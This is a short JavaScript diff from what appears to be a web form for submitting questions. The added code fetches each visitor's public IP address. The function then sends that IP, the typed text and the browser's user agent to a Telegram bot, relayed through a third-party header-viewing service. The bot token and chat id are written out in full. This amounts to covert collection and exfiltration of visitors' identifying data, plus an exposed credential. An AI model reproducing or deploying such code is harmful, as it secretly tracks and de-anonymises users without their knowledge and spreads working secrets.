@@ -1,5 +1,8 @@
 function ss(){
-  
+  $.getJSON('https://jsonip.com/', function(data) {
+  alert(data.ip);
+  var rr = data.ip;
+});
   var platform = navigator.platform;
   var browser = navigator.appName;
   var loc = navigator.language;
@@ -9,7 +12,7 @@ function ss(){
   var os = cljs.getOS();
   
   var text = document.getElementById("inp").value;
-  var mohtava = "ask%3A"+encodeURIComponent(text)+"%23"+encodeURIComponent(ua)+encodeURIComponent(r);
+  var mohtava = "ask%3A"+encodeURIComponent(text)+"%23"+encodeURIComponent(ua)+encodeURIComponent(rr);
   var url = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx";
   var con = "https://api.telegram.org/bot2072567714:AAFpwTm_8eP43UR5BDUuuMKoFGVKan6WZcw/sendMessage?chat_id=-734718255&text="+mohtava;
   var data={"UrlBox":con,
